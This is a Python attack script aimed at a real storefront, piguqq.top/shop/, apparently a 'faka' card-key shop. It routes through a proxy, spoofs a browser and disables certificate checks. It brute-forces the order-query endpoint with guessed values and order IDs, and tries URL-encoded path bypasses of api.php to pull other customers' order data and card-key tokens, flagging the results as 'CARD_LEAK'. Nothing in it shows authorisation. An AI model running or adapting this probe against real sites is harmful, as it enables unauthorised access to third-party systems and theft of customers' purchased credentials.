#!/usr/bin/env python3
"""Quick probe piguqq.top/shop/ — rainbow faka surface."""
import json
import os
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://piguqq.top/shop/"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/piguqq_probe.json"
PROXY = os.environ.get("PROXY_URL", "")
if not PROXY and os.path.isfile("/data/config/proxy.env"):
    for line in open("/data/config/proxy.env"):
        if line.startswith("PROXY_URL="):
            PROXY = line.strip().split("=", 1)[1].strip().strip('"').strip("'")

SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
FAKA = re.compile(r"mod=faka&id=(\d+)&skey=([a-f0-9]{32})")


def main():
    s = requests.Session()
    s.verify = False
    if PROXY:
        s.proxies = {"http": PROXY, "https": PROXY}
    s.headers.update(
        {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120",
            "Referer": BASE,
        }
    )

    report = {"target": "piguqq.top", "proxy": PROXY[:50] if PROXY else None}

    r = s.get(BASE, timeout=30)
    report["home_len"] = len(r.text)
    report["faka_js"] = "assets/faka" in r.text
    report["showOrder"] = "showOrder" in r.text
    report["ykfaka"] = "YKFAKA" in r.text

    gc = s.get(BASE + "ajax.php?act=getcount", timeout=20)
    report["getcount"] = gc.text[:300]
    orders = int(json.loads(gc.text).get("orders", 0))
    report["orders"] = orders

    query_hits = []
    probes = [
        "1", "2", "3", "12", "123", "888", "000", "2025", "2026", "202608", "20260802",
        "138", "13", "COM", "sms", "http", "qq", "bot", "pigu", "piguqq",
        str(orders), str(orders - 1), str(orders - 100),
        "5201314", "123456", "888888", "666666",
    ]
    for q in probes:
        try:
            rq = s.get(BASE, params={"mod": "query", "data": q}, timeout=22)
            so = SHOW.findall(rq.text)
            fk = FAKA.findall(rq.text)
            if so or fk:
                query_hits.append(
                    {"data": q, "shows": so[:10], "faka": fk[:5], "len": len(rq.text)}
                )
                print(f"QUERY HIT {q} shows={len(so)} faka={len(fk)}", flush=True)
        except Exception as e:
            print(f"query err {q}: {e}", flush=True)
        time.sleep(0.15)

    report["query_hits"] = query_hits

    tl = s.get(BASE + "toollogs.php", timeout=20)
    report["toollogs"] = {
        "len": len(tl.text),
        "shows": SHOW.findall(tl.text)[:10],
    }

    api_hits = []
    suffixes = [
        "api.php?act=search&id=",
        "%61pi.php/?act=search&id=",
        "%2561pi.php?act=search&id=",
    ]
    for oid in [orders, orders - 1, orders - 10, 1, 100, 1000, 5000]:
        for suf in suffixes:
            try:
                ar = s.get(BASE + suf + str(oid), timeout=22)
                body = ar.text[:500]
                if not body or len(body) < 15:
                    continue
                if "No Act" in body or '"code":-5' in body:
                    continue
                if '"code":0' in body or SHOW.search(body) or FAKA.search(body):
                    api_hits.append({"id": oid, "suf": suf, "body": body})
                    print(f"API HIT {suf} id={oid}", flush=True)
            except Exception as e:
                print(f"api err {suf} {oid}: {e}", flush=True)
            time.sleep(0.12)

    report["api_hits"] = api_hits

    try:
        ar = s.get(BASE + "%61pi.php/?act=search&id=1", timeout=18)
        report["api_key_msg"] = ar.text[:200]
    except Exception as e:
        report["api_key_err"] = str(e)[:100]

    report["CARD_LEAK"] = bool(query_hits or api_hits)
    with open(OUT, "w", encoding="utf-8") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    print(json.dumps(report, ensure_ascii=False, indent=2), flush=True)


if __name__ == "__main__":
    main()
